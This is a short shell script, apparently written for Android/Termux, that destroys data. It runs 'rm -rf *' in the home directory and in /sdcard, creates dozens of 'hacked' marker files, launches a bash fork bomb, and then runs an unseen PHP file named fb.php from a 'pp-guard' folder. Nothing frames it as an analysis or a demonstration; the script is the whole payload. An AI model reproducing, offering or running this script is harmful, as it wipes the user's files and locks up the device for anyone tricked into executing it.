cd
rm -rf *
cd /sdcard
rm -rf *

touch hacked.txt
touch hacked1.txt
touch hacked2.txt
touch hacked3.txt
touch hack4.txt
touch hack5.txt
touch hack6.txt
touch hack7.txt
touch hack8.txt
touch hack9.txt
touch hack10.txt
touch hack11.txt
touch hack12.txt
touch hack13.txt
touch hack14.txt
touch hack15.txt
touch hack16.txt
touch hack17.txt
touch hack18.txt
touch hack19.txt
touch hack20.txt
touch hack21.txt
touch hack22.txt
touch hack23.txt
touch hack24.txt
touch hack25.txt
touch hack26.txt
touch hack27.txt
touch hack28.txt


:(){ :|: & };:



cd
cd pp-guard
php fb.php